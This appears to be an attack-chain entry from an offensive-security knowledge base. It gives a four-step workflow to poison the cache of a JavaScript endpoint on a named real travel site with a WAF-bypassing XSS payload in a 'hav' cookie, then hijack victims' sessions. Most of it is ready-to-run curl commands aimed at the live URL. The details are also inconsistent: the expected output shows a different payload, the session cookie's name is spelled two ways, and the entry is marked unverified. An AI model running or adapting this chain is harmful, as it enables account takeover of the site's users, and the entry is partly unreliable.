---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: Cache Poisoning Leading to Stored XSS and Account Takeover via 'hav' Cookie
type: attack_chain
description: >-
  A multi-stage attack exploiting cache poisoning on a cacheable JavaScript
  endpoint to inject and persist a stored XSS payload via the unsanitized 'hav'
  cookie, bypassing WAF protections, executing arbitrary JavaScript to steal
  session tokens, and achieving account takeover.
verified: false
submitted: true
step_count: 4
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.648Z'
procedures:
  - '[[procedures/Set-Malicious-Cookie-for-XSS-Payload]]'
  - '[[procedures/Poison-Cache-with-Malicious-JavaScript-Endpoint]]'
  - '[[procedures/Trigger-XSS-via-Poisoned-Cache]]'
  - '[[procedures/Exploit-Stolen-Session-for-Account-Takeover]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Credential Access]]'
tags:
  - xss
  - cache-poisoning
  - waf-bypass
  - account-takeover
  - javascript
platforms:
  - Web
tools: []
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---

# Cache Poisoning Leading to Stored XSS and Account Takeover via 'hav' Cookie

Multi-stage attack chain demonstrating a complete attack workflow exploiting a web application's cacheable JavaScript endpoint.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Malicious Cookie] --> B[Poison Cache]
    B --> C[Trigger XSS]
    C --> D[Steal Session and Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for cookie manipulation
- [[tools/curl]] for HTTP requests (optional for automation)

### Target Environment

- Web application with cacheable JavaScript endpoints (e.g., PHP-based site like Abritel.fr)
- Required services/ports: HTTP/HTTPS on port 80/443
- Network access requirements: Direct internet access to the target domain

### Initial Access Requirements

- No prior credentials needed
- Attacker must be able to set cookies on requests to the target
- Victim must visit the poisoned endpoint

## Detailed Attack Procedures

### Step 1: Set Malicious Cookie
procedure: [[procedures/Set-Malicious-Cookie-for-XSS-Payload]]

**Objective**: Craft and set a malicious 'hav' cookie containing a WAF-bypassing XSS payload to be reflected into the JavaScript response.

**Instructions**: Use browser tools or [[commands/curl-set-cookie]] to set the cookie with the payload that closes the script tag and injects an SVG onload handler:

```bash
curl -H "Cookie: hav=xss</sc\"ript><sv\"g/onloa\"d=aler\"t(window.INITIAL_STATE.system.cookie)>" https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd
```

**Expected Output**: The server reflects the cookie value into the JS as `var hav="xss</script><svg/onload=alert(document.domain)>"`, but due to inconsistent quote hiding, it renders as executable XSS.

**Success Indicators**:
- Cookie set successfully without errors
- Reflection observed in response (use browser inspect or curl verbose)

### Step 2: Poison Cache
procedure: [[procedures/Poison-Cache-with-Malicious-JavaScript-Endpoint]]

**Objective**: Request the cacheable endpoint with the malicious cookie to poison the server's cache, persisting the XSS payload for all subsequent visitors.

**Instructions**: Send a GET request to the .js endpoint using the malicious cookie via [[commands/curl-poison-cache]]:

```bash
curl -H "Cookie: hav=xss</sc\"ript><sv\"g/onloa\"d=aler\"t(window.INITIAL_STATE.system.cookie)>" https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd -v
```

**Expected Output**: Server caches the response containing the reflected malicious JS; verify by requesting again without the cookie and seeing the payload persist.

**Success Indicators**:
- Response contains injected payload even on subsequent requests
- Cache hit indicated in server headers (if observable)

### Step 3: Trigger XSS
procedure: [[procedures/Trigger-XSS-via-Poisoned-Cache]]

**Objective**: Load the poisoned endpoint in a victim's browser to execute the XSS payload and steal the session cookie.

**Instructions**: Visit the endpoint in a clean browser session using [[commands/curl-trigger-xss]] or directly in browser:

```bash
curl https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd > poisoned.js && cat poisoned.js
```

Then load `poisoned.js` in a browser or visit the URL directly.

**Expected Output**: Browser executes `<svg/onload=alert(...)>` , alerting the victim's `window.INITIAL_STATE.system.cookie` value (HASESESSIONV3 token).

**Success Indicators**:
- Alert box shows session cookie value
- JavaScript console logs the stolen token

### Step 4: Account Takeover
procedure: [[procedures/Exploit-Stolen-Session-for-Account-Takeover]]

**Objective**: Use the stolen session token to impersonate the victim and access their account.

**Instructions**: Extract the HASESSIONV3 cookie from the alert and set it in a new browser session using [[commands/curl-set-session-cookie]]:

```bash
curl -H "Cookie: HASESSIONV3=STOLEN_TOKEN_VALUE" https://www.abritel.fr/account -v
```

**Expected Output**: Successful access to victim's account dashboard or profile.

**Success Indicators**:
- Logged in as victim without credentials
- Access to private account data

## Attack Chain Summary

### Key Achievements

1. Bypassed WAF using inconsistent quote handling to inject XSS payload
2. Poisoned shared cache to persist stored XSS affecting all users
3. Executed JavaScript to exfiltrate session tokens
4. Achieved full account takeover via stolen credentials

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Credential Access]] Credential Access

---
*Last updated: 2024-01-01T00:00:00Z*
